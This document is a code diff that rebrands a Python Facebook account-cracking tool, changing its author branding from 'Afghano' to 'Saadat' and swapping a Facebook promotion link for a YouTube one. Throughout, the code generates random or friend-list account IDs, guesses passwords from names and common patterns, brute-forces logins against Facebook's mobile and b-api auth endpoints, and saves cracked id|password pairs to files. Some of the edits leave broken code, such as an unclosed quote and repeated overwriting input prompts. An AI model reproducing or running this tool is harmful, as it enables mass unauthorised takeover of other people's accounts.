@@ -165,7 +165,7 @@ def public_menu():
 	try:
 		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
 		for pi in koh2['friends']['data']:
-			id.append(pi['id']+'|'+pi['Afghano'])
+			id.append(pi['id']+'|'+pi['Saadat])
 		print(' [] Total : '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
@@ -219,7 +219,7 @@ def setting():
 	passmenu()
 def passmenu():
 	clear()
-	print(logo);print  ('\n [01] First Afghano digit pass \n [02] All Afghano Password \n [03] All Afghano+ password')
+	print(logo);print  ('\n [01] First Saadat digit pass \n [02] All Name Password \n [03] All number+ password')
 	passmen=input('\n [#] Select Pass : ')
 	if passmen in ['1','01']:
 		first()
@@ -266,9 +266,9 @@ def Afghano():
 				idf,nmf = yuzong.split('|')
 				xz = nmf.split(' ')
 				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-					pwv = [Afghano, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
+					pwv = [Saadat, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
 				else:
-					pwv = [Afghano, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
+					pwv = [Saadat, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
 				if 'mobile' in method:
 					pool.submit(crack,idf,pwv)
 				elif 'free' in method:
@@ -328,14 +328,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m[AFGHANO-OK] {idf} * {pw}')
+				print( f'\r\x1b[1;91m[Saadat-OK] {idf} * {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;91m [AFGHANO-OK] {idf} * {pw}')
+				print(f'\r\x1b[1;91m [Saadat-OK] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/AFGHANO-OK.txt','a').write('%s\n' % wrt)
@@ -373,7 +373,7 @@ def free(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [Afghano OK] {idf} * {pw}')
+				print(f'\r\x1b[1;92m [Saadat OK] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/Afghano OK','a').write('%s\n' % wrt)
@@ -392,21 +392,23 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
  
 logo = """
-z \033[1;32m....................................................... z
-z \033[1;32m....................................................... z
-z \033[1;97m..%%%%...%%%%%%..%%%%...%%..%%...%%%%...%%..%%...%%%%.. z
-z \033[1;32m.%%..%%..%%.....%%......%%..%%..%%..%%..%%%.%%..%%..%%. z
-z \033[1;97m.%%%%%%..%%%%...%%.%%%..%%%%%%..%%%%%%..%%.%%%..%%..%%. z
-z \033[1;32m.%%..%%..%%.....%%..%%..%%..%%..%%..%%..%%..%%..%%..%%. z
-z \033[1;97m.%%..%%..%%......%%%%...%%..%%..%%..%%..%%..%%...%%%%.. z
+z \033[1;37m....................................................... z
+z \033[1;37m....................................................... z
+z \033[1;97m .########...######..##.....##
+z \033[1;33m .##.....##.##....##.##.....##
+z \033[1;97m .##.....##.##.......##.....##
+z \033[1;32m .########...######..#########
+z \033[1;97m .##...##.........##.##.....##
+z \033[1;32m .##....##..##....##.##.....##
+z \033[1;97m .##.....##..######..##.....##
 z \033[1;37m....................................................... z
 z \033[1;37m....................................................... z
  \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••• 
-\x1b[1;93m[+] 𝗔𝗨𝗧𝗛𝗢𝗥      : Afghano     
-\x1b[1;91m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞    : Afghan Hacher
-\x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕      : http://github.com/Afghano02
-\x1b[1;98m[+] Whatsapp    : 0797423006
-\x1b[1;93m[+] 𝗧𝗘𝗔𝗠        : \33[1;42  Afghano 02\33[0m
+\x1b[1;93m[+] 𝗔𝗨𝗧𝗛𝗢𝗥      : Raziqullah saadat     
+\x1b[1;91m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞    : Raziqullah saadat
+\x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕      : Saadat-SH
+\x1b[1;98m[+] Whatsapp    : +9702856593
+\x1b[1;93m[+] 𝗧𝗘𝗔𝗠        : \33[1;42  Saadat Team\33[0m
 \x1b[1;94m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡     :\x1b[1;97m 3.0.6    \x1b[1;97m          
 \033[1;80m•••••••••••••••••••••••••••••••••••••••••••••• 
 """
@@ -421,12 +423,12 @@ class Main:
 		print(logo)
 		print("")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
-		print("\033[1;32mNOTE : APPROVAL K LIYE FACEBOOK PR FOLLOW KR DEN")
+		print("\033[1;32mNOTE : SMBCRIBE MY CHANNAL FOR APPROVAL")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ")
 		
 		
 		print("")
-		print("\033[1;93m [1] First Send Friend Request  ")
+		print("\033[1;93m [1] First SMBCRIBE MY CHANNAL FOR APPROVAL ")
 		print("\033[1;37m [2] EXIT")
 		print("")
 		Baloch = input("\n\033[1;37m  Choose : \033[1;32m")
@@ -436,12 +438,12 @@ class Main:
 			print("    Thanks♥️")
 			exit()
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-open https://www.facebook.com/afgha.hacker?mibextid=ZbWKwL")
+			os.system("xdg-open https://www.youtube.com/@Saadat.Technical?mibextid=ZbWKwL")
 			print("")
 			time.sleep(2.0)
 			print("\033[1;94m    CHECKING APPROVAL ")
 			print("")
-			input("\n\033[1;91m TYPE THE FACEBOOK ACCOUNT NAME \033[1;32mAfghano\033[0m \033[1;37m")
+			input("\n\033[1;91m TYPE THE FACEBOOK ACCOUNT NAME \033[1;32mSaadat\033[0m \033[1;37m")
 			time.sleep(3.1)
 			print("")
 			print("\033[1;92m WELCOME")
@@ -453,9 +455,9 @@ class Main:
 		print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		print(" \033[1;94m[1] File Cloning ")
 		print(" \033[1;32m[2] Public Cloning")
-		print(" \33[1;32m[3] Pak Random Cloning")
-		print(" \033[1;94m[4] 2004 To 2010 ")
-		print(" \33[1;94m[5] 2010 To 2015 ")
+		print(" \33[1;32m[3] AFG Random Cloning")
+		print(" \033[1;94m[4] 2004 To 2015 ")
+		print(" \33[1;94m[5]AFG Mix ids 2015 To 2023 ")
 		print("\033[1;32m [E] Exit \n")
 		UZAIR =input(" \033[1;91mCHOOSE : ")
 		if UZAIR in ["1", "01"]:
@@ -479,7 +481,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[1;32m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input(" \n\033[0;95m[+]\033[1;32m TOTAL IDS TO CRACK LIMIT 1000,2000,3000,500,1000,50,000... "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -489,22 +491,27 @@ class Main:
 			print("\033[1;32m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n\033[1;32m [!] Ex(123456-1234567-123456789) FOR Old IDZ\033[1;37m ")
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
+				print("\n\033[1;93m [2] Ex(afghan123-khan123-afghanistan-kabul123...) AFG Mix IDZ\033[1;37m ")
+				listpass = input("%s [1] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [2] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [2] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [2] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [2] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+					exit("\n%s [!] PASSWORD MINIMUM 6-10 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("     \033[0;93m   Premium Mode  Activated")
 				print("\n\033[0;94m [+] BRUTE HAS BEEN STARTED")
-				print(" \033[0;96m[+] Note : 50% CP Account'S Open Just Now")
+				print(" \033[0;96m[+] Whatsapp   +93702856593")
 				print(" [!] 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗔𝗜𝗥𝗢𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗E UNTILL DEATH")
 				print("\033[0;94m------------------------------------------------")
 				print("\n")
 				print("\033[1;37m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using my tool...")
+			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using Saadat tool...")
 		except Exception as e:exit(str(e))
  
 	def api(self, uid, pwx):
@@ -512,7 +519,7 @@ class Main:
 		"Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion;]"
 		])
 		sys.stdout.write(
-			"\r [Afghano]%s> /[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [Saadat]%s> /[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -529,13 +536,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_Afghano=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[AFGHANO-OK]%s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[Saadat-OK]%s | %s\033[1;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("SM-OK","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[Afghano OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[Saadat OK] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("SM-OK","a").write(" %s | %s\n"%(uid, pw))
 				break
@@ -549,7 +556,7 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[1;32m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input("\n \033[0;95m[+]\033[1;32m TOTAL IDS TO CRACK LIMIT 1000,2000,3000,500,1000,50,000... "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -558,23 +565,28 @@ class Main:
 			
 			print("\033[1;32m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;93m [!] Ex(123456-1234567-123456789) FOR Old IDZ\033[1;37m ")
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
+				print("\n\033[1;93m [1] Ex(123456-1234567-123456789) FOR Old IDZ\033[1;37m ")
+				print("\n\033[1;93m [2] Ex(afghan123-khan123-afghanistan-kabul123...) AFG Mix IDZ\033[1;37m ")
+				listpass = input("%s [1] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [2] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [2] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [2] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [2] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+					exit("\n%s [!] PASSWORD MINIMUM 6-10 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("     \033[0;93m   Premium Mode  Activated")
 				print("\n\033[0;94m [+] BRUTE HAS BEEN STARTED")
-				print(" \033[0;96m[+] Note : 50% CP Account'S Open Just Now")
+				print(" \033[0;96m[+] Whatsapp   +93702856593")
 				print(" [!] 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗔𝗜𝗥𝗢𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗𝗘 UNTILL DEATH")
 				print("\033[0;94m------------------------------------------------")
 				print("\n")
 				print("\033[1;37m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[THANKS FOR USING SILENT-786 TOOL...")
+			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[THANKS FOR USING Saadat-SH TOOL...")
 		except Exception as e:exit(str(e))
  
 	def api(self, uid, pwx):
@@ -943,7 +955,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	])
 		sys.stdout.write(
-			"\r [Afghano]>%s/[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [Saadat]>%s/[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -960,13 +972,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_Afghano=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[Afghano OK] %s | %s\033[0;32m         "%(uid, pw))
+				print("\r \033[1;32m[Saadat OK] %s | %s\033[0;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("SM-OK","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[Afghano OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[Saadat OK] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
